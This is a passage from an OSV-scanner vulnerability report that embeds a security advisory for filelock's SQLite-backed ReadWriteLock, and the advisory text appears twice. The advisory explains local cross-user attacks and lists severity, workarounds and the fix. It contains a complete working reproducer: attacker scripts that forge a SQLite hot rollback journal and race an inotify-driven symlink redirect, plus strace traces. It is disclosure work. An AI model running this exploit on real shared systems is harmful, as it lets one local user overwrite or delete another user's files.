```\n\u003e \n\u003e The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.\n\u003e \n\u003e **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `\u003cdatabase\u003e-journal`, `\u003cdatabase\u003e-wal` and `\u003cdatabase\u003e-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.\n\u003e \n\u003e *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a \"super-journal\", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink(\"/home/victim/private/notes.txt\") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).\n\u003e \n\u003e *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `\u003cdb\u003e-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `\u003cdb\u003e-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.\n\u003e \n\u003e The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `\u003cdb\u003e-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.\n\u003e \n\u003e *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `\u003cdb\u003e-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only \"database is locked\" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.\n\u003e \n\u003e *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.\n\u003e \n\u003e A journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.\n\u003e \n\u003e **The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.\n\u003e \n\u003e With `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.\n\u003e \n\u003e ## Reproduction\n\u003e \n\u003e The scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e \n\u003e as_victim = {\"user\": \"victim\", \"group\": \"victim\", \"extra_groups\": []}\n\u003e as_attacker = {\"user\": \"attacker\", \"group\": \"attacker\", \"extra_groups\": []}\n\u003e \n\u003e # set up: the lock database lives in a shared cache directory, 0777 and not sticky\n\u003e shared_dir = \"/tmp/shared-cache\"\n\u003e lock_db = shared_dir + \"/cache.lock.db\"\n\u003e shutil.rmtree(shared_dir, ignore_errors=True)\n\u003e os.mkdir(shared_dir)\n\u003e os.chmod(shared_dir, 0o777)\n\u003e \n\u003e # set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write\n\u003e target = \"/tmp/victim-notes.txt\"\n\u003e for leftover in (target, target + \"-journal\"):\n\u003e     if os.path.lexists(leftover):\n\u003e         os.unlink(leftover)\n\u003e original = b\"original victim notes\\n\"\n\u003e with open(target, \"wb\") as notes:\n\u003e     notes.write(original)\n\u003e shutil.chown(target, \"victim\", \"victim\")\n\u003e os.chmod(target, 0o600)\n\u003e direct_write = subprocess.run(\n\u003e     [sys.executable, \"-c\", \"import sys; open(sys.argv[1], 'r+b')\", target], capture_output=True, text=True, **as_attacker\n\u003e )\n\u003e print(\"attacker opening the target for writing:\", direct_write.stderr.strip().splitlines()[-1])\n\u003e assert direct_write.returncode != 0\n\u003e \n\u003e # attack: a hot journal beside the target, and a redirect of the victim's SQLite from the lock database to the target\n\u003e content = \"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\"\n\u003e subprocess.run([sys.executable, \"/tmp/repro.d/plant_hot_journal.py\", target, content], check=True, **as_attacker)\n\u003e redirect = subprocess.Popen(\n\u003e     [sys.executable, \"/tmp/repro.d/redirect_lock_db.py\", lock_db, target], stdout=subprocess.PIPE, text=True, **as_attacker\n\u003e )\n\u003e assert redirect.stdout.readline() == \"ready\\n\"\n\u003e \n\u003e # the victim takes its read lock; the attacker races each acquire, so the victim runs up to 20 times\n\u003e for run in range(1, 21):\n\u003e     victim = subprocess.run(\n\u003e         [sys.executable, \"/tmp/repro.d/victim_app.py\", lock_db], capture_output=True, text=True, timeout=60, **as_victim\n\u003e     )\n\u003e     with open(target, \"rb\") as notes:\n\u003e         after = notes.read()\n\u003e     if after != original:\n\u003e         break\n\u003e redirect.kill()\n\u003e redirect.wait()\n\u003e \n\u003e # check: taking a lock on cache.lock.db must leave the victim's notes alone\n\u003e print(f\"victim run {run}: exit status {victim.returncode}:\", (victim.stderr.strip() or \"no error\").splitlines()[-1])\n\u003e status = os.stat(target)\n\u003e print(\"target owner, mode, size:\", status.st_uid, oct(status.st_mode \u0026 0o7777), status.st_size)\n\u003e print(\"target before:\", original)\n\u003e print(\"target after: \", after[:60])\n\u003e print(\"BUG\" if after == content.encode().ljust(4096, b\"\\0\") else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/plant_hot_journal.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The attacker: leave a rollback journal beside TARGET whose one record restores TARGET's first page to CONTENT.\"\"\"\n\u003e \n\u003e import os\n\u003e import struct\n\u003e import sys\n\u003e \n\u003e target, content = sys.argv[1], sys.argv[2].encode()\n\u003e journal_path = target + \"-journal\"\n\u003e \n\u003e # https://www.sqlite.org/fileformat2.html#the_rollback_journal\n\u003e JOURNAL_MAGIC = bytes.fromhex(\"d9d505f920a163d7\")\n\u003e page_size, sector_size, nonce = 4096, 512, 0x11223344\n\u003e record_count = 1\n\u003e pages_after_rollback = 1  # SQLite truncates TARGET to this many pages\n\u003e header = JOURNAL_MAGIC + struct.pack(\"\u003eIIIII\", record_count, nonce, pages_after_rollback, sector_size, page_size)\n\u003e \n\u003e page_number = 1  # page 1 starts at offset 0\n\u003e page_image = content.ljust(page_size, b\"\\0\")\n\u003e # SQLite's pager_cksum(): the nonce plus every 200th byte, counting down from page_size - 200\n\u003e checksum = (nonce + sum(page_image[i] for i in range(page_size - 200, 0, -200))) \u0026 0xFFFFFFFF\n\u003e record = struct.pack(\"\u003eI\", page_number) + page_image + struct.pack(\"\u003eI\", checksum)\n\u003e \n\u003e with open(journal_path, \"wb\") as journal:\n\u003e     journal.write(header.ljust(sector_size, b\"\\0\") + record)\n\u003e os.chmod(journal_path, 0o666)  # the victim's SQLite opens a hot journal O_RDWR\n\u003e ```\n\u003e \n\u003e **`repro.d/redirect_lock_db.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The attacker: make the victim's SQLite, connecting through /proc/self/fd/\u003cn\u003e, open TARGET instead of LOCK_DB.\"\"\"\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import sys\n\u003e \n\u003e lock_db, target = sys.argv[1], sys.argv[2]\n\u003e spare_name = lock_db + \".keep\"\n\u003e \n\u003e # the attacker creates the lock database, world-writable so that the victim's ReadWriteLock accepts it\n\u003e os.close(os.open(lock_db, os.O_CREAT | os.O_WRONLY))\n\u003e os.chmod(lock_db, 0o666)\n\u003e os.link(lock_db, spare_name)\n\u003e \n\u003e # what /proc/\u003cpid\u003e/fd/\u003cn\u003e reads back as once the name the descriptor was opened through is unlinked\n\u003e os.symlink(target, lock_db + \" (deleted)\")\n\u003e \n\u003e IN_OPEN = 0x20\n\u003e libc = ctypes.CDLL(None, use_errno=True)\n\u003e inotify = libc.inotify_init1(0)\n\u003e if libc.inotify_add_watch(inotify, lock_db.encode(), IN_OPEN) \u003c 0:\n\u003e     raise OSError(ctypes.get_errno(), \"inotify_add_watch\", lock_db)\n\u003e print(\"ready\", flush=True)\n\u003e \n\u003e while True:\n\u003e     os.read(inotify, 4096)  # the victim's ReadWriteLock has opened the database and is validating its descriptor\n\u003e     os.unlink(lock_db)\n\u003e     os.link(spare_name, lock_db)  # the same inode back at the path, so filelock's later lstat sees no change\n\u003e ```\n\u003e \n\u003e **`repro.d/victim_app.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The victim: an application that takes its shared read lock once, as in docs/how-to.rst.\"\"\"\n\u003e \n\u003e import sys\n\u003e \n\u003e from filelock import ReadWriteLock\n\u003e \n\u003e rw = ReadWriteLock(sys.argv[1])\n\u003e with rw.read_lock(timeout=5):\n\u003e     pass\n\u003e ```\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e The redirect, with `A` the other local user:\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as other local user\n\u003e     participant V as lock user's process (filelock)\n\u003e     participant S as SQLite inside that process\n\u003e     participant K as kernel and filesystem\n\u003e     rect rgb(255, 214, 214)\n\u003e         Note over A,K: filelock 4.0.9 to 4.2.0 on Linux, lock directory 0777 without the sticky bit\n\u003e         A-\u003e\u003eK: create cache.lock.db (0666) and a second hard link cache.lock.db.keep\n\u003e         A-\u003e\u003eK: symlink \"cache.lock.db (deleted)\" pointing at /tmp/victim-notes.txt\n\u003e         A-\u003e\u003eK: write /tmp/victim-notes.txt-journal (hot rollback journal, one page record)\n\u003e         V-\u003e\u003eK: open(cache.lock.db, O_RDWR O_CREAT O_NOFOLLOW) gives fd 3, fstat says regular, header not WAL\n\u003e         K--\u003e\u003eA: inotify IN_OPEN on cache.lock.db\n\u003e         A-\u003e\u003eK: unlink(cache.lock.db) then link(cache.lock.db.keep, cache.lock.db)\n\u003e         V-\u003e\u003eS: sqlite3.connect(\"/proc/self/fd/3\")\n\u003e         S-\u003e\u003eK: readlink(/proc/self/fd/3) returns \"cache.lock.db (deleted)\"\n\u003e         S-\u003e\u003eK: open(\"cache.lock.db (deleted)\") follows the symlink to victim-notes.txt\n\u003e         V-\u003e\u003eS: PRAGMA journal_mode=MEMORY\n\u003e         S-\u003e\u003eK: open(victim-notes.txt-journal), pread page 1, pwrite it at offset 0 of victim-notes.txt\n\u003e         Note over V,K: victim-notes.txt (0600, 22 bytes) is now the other user's 4096-byte page image, the lock user sees \"disk I/O error\"\n\u003e         V-\u003e\u003eK: lstat(cache.lock.db) matches fd 3 identity, so _raise_if_database_replaced passes\n\u003e     end\n\u003e ```\n\u003e \n\u003e The side-file variants, which need no redirect:\n\u003e \n\u003e ```mermaid\n\u003e flowchart TD\n\u003e     B0[\"acquire validates fd, connects SQLite by a name in the shared directory\"] --\u003e B1{\"what did the other user put beside the real path?\"}\n\u003e     B1 -- \"hot -journal beside a swapped-in one-page database\" --\u003e B2[\"PRAGMA replays the journal, then unlinks the super-journal file it names, acquire succeeds\"]\n\u003e     B1 -- \"-wal re-created between PRAGMA and BEGIN\" --\u003e B3[\"holder in WAL mode, reader admitted beside the writer, SIGBUS when -shm is truncated\"]\n\u003e     B1 -- \"-wal in a sticky directory the lock user cannot unlink\" --\u003e B4[\"every acquire raises OperationalError disk I/O error, timeout ignored\"]\n\u003e     B1 -- \"name unlinked and a (deleted) symlink planted\" --\u003e B5[\"SQLite opens the symlink target with O_CREAT\"]\n\u003e     classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;\n\u003e     classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;\n\u003e     classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;\n\u003e     class B0,B1 info;\n\u003e     class B2,B3,B4,B5 bad;\n\u003e ```\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e The scanner's reproducer runs the documented `ReadWriteLock(path)` + `with rw.read_lock(timeout=5):` as user `victim` against `/tmp/shared-cache/cache.lock.db` (directory `0777`, not sticky) while user `attacker` holds the symlink and reacts to inotify. It first shows that `attacker` cannot write the target (`PermissionError: [Errno 13] Permission denied: '/tmp/victim-notes.txt'`). On the first `victim` run it prints `victim run 1: exit status 1: sqlite3.OperationalError: disk I/O error`, `target owner, mode, size: 1000 0o600 4096`, target before `b'original victim notes\\n'`, after `b\"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\\x00...\"`, verdict `BUG`. Reacting to inotify redirected the first acquire in 77 of 77 runs. A plain unlink/link busy loop with no inotify also won on the first run. A process holding two `ReadWriteLock` instances on one database keeps an idle descriptor; a swap done a full second before the second acquire redirected it. The `-wal` re-plant landed on the first attempt in 20 of 20 runs. The journal-unlink variant needs no race.\n\u003e \n\u003e Our verification: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head it prints `OK`: all 20 `victim` runs exit 0 with no error and the target stays `1000 0o600 22` bytes with its original content. The independent review also ran the sticky-directory `-wal` variant (a `0600` database owned by `victim` in a `1777` directory, other user plants `\u003cdb\u003e-wal`). 4.2.0 raises `OperationalError: disk I/O error`; the PR head takes read and write locks with the file still present.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Another local user who can write the non-sticky directory holding the database makes the lock user's process act on a file other than the lock database, with the lock user's privileges, on Linux. The process writes bytes of the other user's choosing from offset 0 into any non-empty regular file the lock user can write, resized to a whole number of pages, provided the other user can create `\u003cfile\u003e-journal` beside it (the lock user's own `0600` files in `/tmp` qualify). Without a journal the process creates an empty file at any path it may create, or converts a WAL-mode SQLite database of its own to rollback mode with no error. A journal beside a swapped-in database makes the process unlink one regular file of the other user's choosing per journal; the acquire succeeds and raises nothing. A process inside `write_lock()` stops excluding the lock user's other processes from `read_lock()`, and the holder can die from a `SIGBUS` that arrives in `release()`.\n\u003e \n\u003e It is **not** reachable for a database the lock user owns in `/tmp` with `fs.protected_regular` 1 or 2. There only the planted `-wal` denial of service remains: every acquire raises an undocumented `sqlite3.OperationalError` that `Timeout` and `OSError` handlers do not catch. It is a bypass of the fix for GHSA-j8f7-rjxc-mr56 (4.0.9), which refused the symlink at the database path but followed it at `\u003cdatabase\u003e (deleted)`. Windows does not take this path.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content.\n\u003e - For a lock in a sticky directory keep `fs.protected_regular` at 1 or 2 and `fs.protected_hardlinks=1` (distribution defaults). Treat a sudden `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `\u003cdb\u003e-wal` beside the database that the file's owner or root has to remove.\n\u003e \n\u003e ## Patched version\n\u003e \n\u003e 4.2.1.\n\u003e \n\u003e Fix: https://github.com/tox-dev/filelock/pull/834\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\u003e \n\u003e - 2026-10-15 23:08 UTC: report received (scan `filelock-20261015-005` of commit `b831496b0273`)\n\u003e - 2026-10-16 00:46 UTC: draft advisory created\n\u003e - 2026-10-16 01:15 UTC: fix PR #834 opened\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | filelock | 3.32.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-v4x8-3wr5-3wq8 | filelock | 4.2.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112940\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112940](https://osv.dev/CVE-2026-112940)**.\n\n## [GHSA-v4x8-3wr5-3wq8](https://osv.dev/GHSA-v4x8-3wr5-3wq8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e `ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/\u003cn\u003e`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.\n\u003e \n\u003e Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).\n\u003e \n\u003e Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.\n\u003e \n\u003e ## Severity\n\u003e \n\u003e **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.\n\u003e \n\u003e Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.\n\u003e \n\u003e ## Scope and preconditions\n\u003e \n\u003e - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`.\n\u003e - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `\u003cdb\u003e-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`.\n\u003e - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory.\n\u003e - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under \"Mechanism\", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path.\n\u003e - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/\u003cn\u003e` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), \"Descriptor paths reopen the validated inode\" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).\n\u003e \n\u003e ## Introduced\n\u003e \n\u003e The `/proc/self/fd` redirect came with `4d45e83` (\"Merge commit from fork\", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` (\"feat(lock): add SQLite-based ReadWriteLock (#399)\"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect(\"/proc/self/fd/\u003cn\u003e\")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink(\"/proc/534/fd/3\") = \"/tmp/benign/app.lock.db\"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `\u003cdatabase\u003e (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.\n\u003e \n\u003e The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -\u003e /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.\n\u003e \n\u003e The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `\u003ctarget\u003e-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):\n\u003e \n\u003e ```\n\u003e openat(\"/tmp/shared-cache/cache.lock.db\", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3\n\u003e readlink(\"/proc/3819/fd/3\", \"/tmp/shared-cache/cache.lock.db (deleted)\", 4096) = 41\n\u003e readlink(\"/tmp/shared-cache/cache.lock.db (deleted)\", \"/tmp/victim-notes.txt\", 4096) = 21\n\u003e openat(\"/tmp/victim-notes.txt\", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4\n\u003e openat(\"/tmp/victim-notes.txt-journal\", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5\n\u003e pread64(5, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 516) = 4096\n\u003e pwrite64(4, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 0) = 4096\n\u003e unlink(\"/tmp/victim-notes.txt-journal\") = -1 EPERM            -\u003e \"disk I/O error\"\n\u003e ```\n\u003e \n\u003e The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.\n\u003e \n\u003e **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `\u003cdatabase\u003e-journal`, `\u003cdatabase\u003e-wal` and `\u003cdatabase\u003e-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.\n\u003e \n\u003e *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and 